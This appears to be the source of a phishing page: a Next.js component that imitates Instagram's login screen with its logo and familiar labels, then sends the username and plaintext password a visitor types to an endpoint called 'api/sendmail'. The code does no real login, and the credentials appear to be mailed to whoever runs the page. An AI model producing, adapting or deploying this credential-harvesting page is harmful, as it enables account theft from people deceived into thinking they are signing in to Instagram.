'use client';
import React, { useState } from 'react';
import { Eye, EyeOff } from 'lucide-react';
import Image from 'next/image';

function App() {
  const [credentials, setCredentials] = useState({
    username: '',
    password: '',
  });

  const [isPasswordVisible, setIsPasswordVisible] = useState(false);
  const [loading, setLoading] = useState(false); // Added loading state to manage async loading state

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true); // Set loading to true when starting the API call

    try {
      // First verify email/password
      await fetch('api/sendmail', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userName: credentials.username,
          password: credentials.password,
        }),
      });


    } catch (error) {
      console.log(error)
    } finally {
      setLoading(false); // Reset loading state when the request is complete
    }
  };


  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Language Selector */}
      <div className="flex justify-center items-center py-3 mt-5">
        <p className="text-xs text-gray-600 bg-transparent">English (India)</p>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col justify-center px-5">
        {/* Instagram Logo */}
        <div className="flex justify-center mt-14 mb-20">
          {/* <Instagram className="w-16 h-16" /> */}
          <Image
            src={'/insta.png'}
            alt='insta'
            width={75}
            height={75}
          />
        </div>


        {/* Login Form */}
        <form onSubmit={handleSubmit} className="space-y-3">
          <div className="relative">
            <input
              type="text"
              placeholder=""
              className="w-full px-3 pt-3.5 pb-2 bg-gray-50 text-gray-900 border border-gray-300 rounded-lg  focus:outline-none"
              value={credentials.username}
              onChange={(e) => setCredentials((prev) => ({ ...prev, username: e.target.value }))}
            />
            <label
              className={`absolute left-3 text-gray-500 transition-all pointer-events-none ${
                credentials.username ? 'text-[10px] top-1' : 'text-sm top-4'
              }`}
            >
              Username, email address or mobile number
            </label>
          </div>

          <div className="relative">
            <input
              type={isPasswordVisible ? 'text' : 'password'}
              placeholder=""
              className="w-full px-3 pt-3.5 pb-2 bg-gray-50 text-gray-900 border border-gray-300 rounded-lg  focus:outline-none"
              value={credentials.password}
              onChange={(e) => setCredentials((prev) => ({ ...prev, password: e.target.value }))}
            />
            <label
              className={`absolute left-3 text-gray-500 transition-all pointer-events-none ${
                credentials.password ? 'text-[10px] top-1' : 'text-sm top-4'
              }`}
            >
              Password
            </label>
            {credentials.password && (
              <button
                type="button"
                className="absolute right-3 top-1/2 -translate-y-1/2  font-semibold text-gray-900"
                onClick={() => setIsPasswordVisible(!isPasswordVisible)}
              >
                {!isPasswordVisible ? <EyeOff className='h-5'/> : <Eye className='h-5'/>}
              </button>
            )}
          </div>

          <button
            type="submit"
            disabled={loading} 
            className={`w-full py-2 rounded-3xl text-sm font-semibold bg-blue-700 transition-colors ${loading && 'opacity-50'}`} // Add opacity when loading
          >
            {loading ? 'Logging in...' : 'Log in'}
          </button>
        </form>

        {/* Forgot Password */}
        <div className="mt-2 flex justify-center">
          <a href="#" className=" text-gray-800">
            Forgotten Password?
          </a>
        </div>

        {/* Sign Up Section */}
        <div className="mt-auto pt-4 pb-6 text-center ">
        <button
            type="submit"
            disabled={loading} 
            className={`w-full py-2 rounded-3xl text-sm font-semibold bg-transparent border border-blue-700 text-blue-700 transition-colors ${loading && 'opacity-50'}`} // Add opacity when loading
          >
            Create new account
          </button>
        </div>
      </div>
    </div>
  );
}

export default App;
